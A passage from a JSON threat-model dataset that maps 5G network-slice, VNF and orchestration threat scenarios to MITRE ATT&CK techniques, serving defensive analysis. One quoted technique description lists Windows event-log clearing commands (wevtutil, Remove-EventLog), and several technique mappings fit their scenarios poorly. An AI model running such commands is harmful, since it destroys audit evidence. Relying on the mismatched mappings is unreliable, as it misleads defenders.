                {
                    "Assumption": "No data redaction policies",
                    "Role": "Data Protection Officer",
                    "Condition": "Data redaction is not implemented"
                }
            ],
            "Potential Impact": "Exposure of operational data leading to potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "external interface",
                "data leakage",
                "information disclosure",
                "API security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit VNFs to access sensitive system configurations.",
            "Assumptions": [
                {
                    "Assumption": "Weak VNF protections and vulnerabilities",
                    "Role": "VNF Security Specialist",
                    "Condition": "Vulnerabilities are unpatched"
                },
                {
                    "Assumption": "Lack of network segmentation",
                    "Role": "Network Architect",
                    "Condition": "Poor network segmentation"
                },
                {
                    "Assumption": "Insufficient access control policies",
                    "Role": "Policy Manager",
                    "Condition": "Policies are inadequate"
                }
            ],
            "Potential Impact": "Unauthorized access to system configurations and possible data breaches.",
            "MITRE ATT&CK Keywords": [
                "VNF",
                "configuration access",
                "information disclosure",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers could launch DDoS attacks against network slices causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient network slice isolation",
                    "Role": "Network Architect",
                    "Condition": "Slices are not well isolated"
                },
                {
                    "Assumption": "No DDoS protection mechanisms",
                    "Role": "Security Engineer",
                    "Condition": "DDoS mitigation tools are missing"
                },
                {
                    "Assumption": "Lack of network traffic analysis",
                    "Role": "Network Analyst",
                    "Condition": "Traffic is not monitored regularly"
                }
            ],
            "Potential Impact": "Service disruption impacting availability of network services.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network slice",
                "denial of service",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actors could exploit resource exhaustion vulnerabilities in VNFs to cause outages.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable VNFs with known bugs",
                    "Role": "VNF Developer",
                    "Condition": "Bugs are not patched timely"
                },
                {
                    "Assumption": "No resource limiting mechanisms",
                    "Role": "Resource Manager",
                    "Condition": "Lack of resource management policies"
                },
                {
                    "Assumption": "Insufficient monitoring and alerting",
                    "Role": "Monitoring Team",
                    "Condition": "Monitoring tools are inadequate"
                }
            ],
            "Potential Impact": "Outages and reduced performance of critical network functions.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "VNF",
                "denial of service",
                "outages"
            ],
            "mitre_technique": {
                "name": "Service Exhaustion Flood",
                "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",
                "id": "attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858",
                "technique_id": "T1499.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Edge computing nodes could be targeted for resource depletion attacks.",
            "Assumptions": [
                {
                    "Assumption": "Lack of resource allocation controls",
                    "Role": "Edge Node Manager",
                    "Condition": "Controls are not in place"
                },
                {
                    "Assumption": "Minimal redundancy in edge infrastructure",
                    "Role": "Redundancy Planner",
                    "Condition": "Redundancy mechanisms are missing"
                },
                {
                    "Assumption": "Low capacity for distributed denial of service detection",
                    "Role": "Security Operations Center",
                    "Condition": "Detection tools are insufficient"
                }
            ],
            "Potential Impact": "Degraded performance of latency-sensitive applications.",
            "MITRE ATT&CK Keywords": [
                "edge computing",
                "resource depletion",
                "denial of service",
                "latency"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could escalate privileges within the virtualized environment to gain control over multiple VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient hypervisor security",
                    "Role": "Virtual Environment Manager",
                    "Condition": "Hypervisors are not secured"
                },
                {
                    "Assumption": "Lax privilege management",
                    "Role": "Privilege Management Officer",
                    "Condition": "Privileges are not well managed"
                },
                {
                    "Assumption": "Weak isolation of VNFs",
                    "Role": "Network Security Architect",
                    "Condition": "VNFs are not robustly isolated"
                }
            ],
            "Potential Impact": "Attacker gains control over multiple network functions resulting in potential widespread compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "virtualized environment",
                "elevation of privilege",
                "control"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of misconfigured network functions to achieve administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured NFs due to human error",
                    "Role": "Network Administrator",
                    "Condition": "Errors in configuration"
                },
                {
                    "Assumption": "Insufficient configuration validation",
                    "Role": "Configuration Manager",
                    "Condition": "Validation checks are missing"
                },
                {
                    "Assumption": "Weak auditing of NF changes",
                    "Role": "Audit Manager",
                    "Condition": "Audit processes are weak"
                }
            ],
            "Potential Impact": "Administrative access obtained leading to potential full network control.",
            "MITRE ATT&CK Keywords": [
                "network function",
                "misconfiguration",
                "elevation of privilege",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers could exploit orchestration tools flaws to elevate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Flaws in orchestration tool design",
                    "Role": "DevOps Engineer",
                    "Condition": "Design flaws exist"
                },
                {
                    "Assumption": "Lack of regular security patching",
                    "Role": "Patch Management Officer",
                    "Condition": "Security patches are not applied timely"
                },
                {
                    "Assumption": "Inadequate user access controls",
                    "Role": "User Access Manager",
                    "Condition": "Access controls are weak"
                }
            ],
            "Potential Impact": "Privilege escalation within orchestration tools leading to broader access control failures.",
            "MITRE ATT&CK Keywords": [
                "orchestration tools",
                "flaws",
                "elevation of privilege",
                "access control"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user's identity to access a network slice.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the same network segment as the legitimate user.",
                    "Role": "Attacker",
                    "Condition": "Network Segmentation Insufficient"
                },
                {
                    "Assumption": "The system has weak authentication mechanisms allowing identity spoofing.",
                    "Role": "System",
                    "Condition": "Weak Authentication"
                },
                {
                    "Assumption": "User's credentials may be intercepted or guessed.",
                    "Role": "User",
                    "Condition": "Insufficient Credential Security"
                }
            ],
            "Potential Impact": "Unauthorized access to network resources and potential data exposure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary utilizes a fake base station to intercept network traffic.",
            "Assumptions": [
                {
                    "Assumption": "Adversary has technical capability to create and operate a fake base station.",
                    "Role": "Adversary",
                    "Condition": "Technical Capability"
                },
                {
                    "Assumption": "5G devices do not verify the authenticity of base stations.",
                    "Role": "Device",
                    "Condition": "Weak Verification Mechanisms"
                },
                {
                    "Assumption": "Network lacks mechanisms to detect rogue base stations.",
                    "Role": "Network",
                    "Condition": "Lack of Detection"
                }
            ],
            "Potential Impact": "Interception and modification of network traffic, leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Fake DNS server disrupts domain name resolution in the network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is able to redirect DNS requests to a controlled server.",
                    "Role": "Attacker",
                    "Condition": "DNS Redirection"
                },
                {
                    "Assumption": "The network does not use DNS security extensions.",
                    "Role": "Network",
                    "Condition": "Lack of DNSSEC"
                },
                {
                    "Assumption": "DNS traffic is not sufficiently encrypted.",
                    "Role": "Network",
                    "Condition": "Insufficient Encryption"
                }
            ],
            "Potential Impact": "Users directed to malicious sites, leading to phishing and malware attacks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "DNS",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of a network slice.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls on configuration management interfaces.",
                    "Role": "System",
                    "Condition": "Weak Access Controls"
                },
                {
                    "Assumption": "Configuration changes are not securely logged and monitored.",
                    "Role": "System",
                    "Condition": "Poor Logging"
                },
                {
                    "Assumption": "Users with access to the configuration interface can have their credentials compromised.",
                    "Role": "User",
                    "Condition": "Credential Compromise"
                }
            ],
            "Potential Impact": "Disruption of services and potential unauthorized activities on the network slice.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "authorization"
            ],
            "mitre_technique": {
                "name": "Hidden Window",
                "description": "Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be\u00a0<code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n",
                "id": "attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf",
                "technique_id": "T1143"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software tampered and uploaded to virtualized network function instances.",
            "Assumptions": [
                {
                    "Assumption": "Attacker gains access to VNF repository.",
                    "Role": "Attacker",
                    "Condition": "Repository Access"
                },
                {
                    "Assumption": "Download and deployment process of VNF does not include integrity checks.",
                    "Role": "System",
                    "Condition": "Lack of Integrity Checks"
                },
                {
                    "Assumption": "No robust validation of VNF before deployment.",
                    "Role": "Network",
                    "Condition": "Poor Validation Process"
                }
            ],
            "Potential Impact": "Malware propagation leading to data breaches and service disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "virtualized environment",
                "network function"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Intruder modifies orchestration management policies.",
            "Assumptions": [
                {
                    "Assumption": "Compromised access to orchestration management tools.",
                    "Role": "Attacker",
                    "Condition": "Access Compromise"
                },
                {
                    "Assumption": "Weak authentication mechanisms in orchestration management.",
                    "Role": "System",
                    "Condition": "Weak Authentication"
                },
                {
                    "Assumption": "Insufficient validation and monitoring of policy changes.",
                    "Role": "System",
                    "Condition": "Poor Monitoring"
                }
            ],
            "Potential Impact": "Compromised resource allocation leading to denial of service or degraded performance.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "policy"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User disputes unauthorized modification of network slice configuration.",
            "Assumptions": [
                {
                    "Assumption": "System does not maintain comprehensive and tamper-proof logs.",
                    "Role": "System",
                    "Condition": "Weak Logging"
                },
                {
                    "Assumption": "Modifications are not attributed to specific users.",
                    "Role": "System",
                    "Condition": "Lack of Attribution"
                },
                {
                    "Assumption": "There is no system for detecting and alerting about unauthorized changes.",
                    "Role": "System",
                    "Condition": "Poor Detection"
                }
            ],
            "Potential Impact": "Impacts the trust in system integrity and security.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "unauthorized modification"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Denial by a user regarding sending an important service request.",
            "Assumptions": [
                {
                    "Assumption": "User activity is not tracked and verifiable.",
                    "Role": "System",
                    "Condition": "Lack of Activity Tracking"
                },
                {
                    "Assumption": "Service request logs can be modified.",
                    "Role": "System",
                    "Condition": "Log Integrity Issues"
                },
                {
                    "Assumption": "No non-repudiation mechanisms are employed.",
                    "Role": "System",
                    "Condition": "Poor Non-repudiation"
                }
            ],
            "Potential Impact": "Service denial and potential sabotage claims.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "request denial",
                "activity tracking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrator denies unauthorized access and modification of VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Admin actions are not logged securely.",
                    "Role": "System",
                    "Condition": "Weak Logging"
                },
                {
                    "Assumption": "Administrator access controls are not sufficiently robust.",
                    "Role": "System",
                    "Condition": "Weak Access Controls"
                },
                {
                    "Assumption": "There is no mechanism to verify or audit admin actions.",
                    "Role": "System",
                    "Condition": "Lack of Auditing"
                }
            ],
            "Potential Impact": "Loss of trust in administrative controls and potential system misuse.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "administrative access",
                "log integrity"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
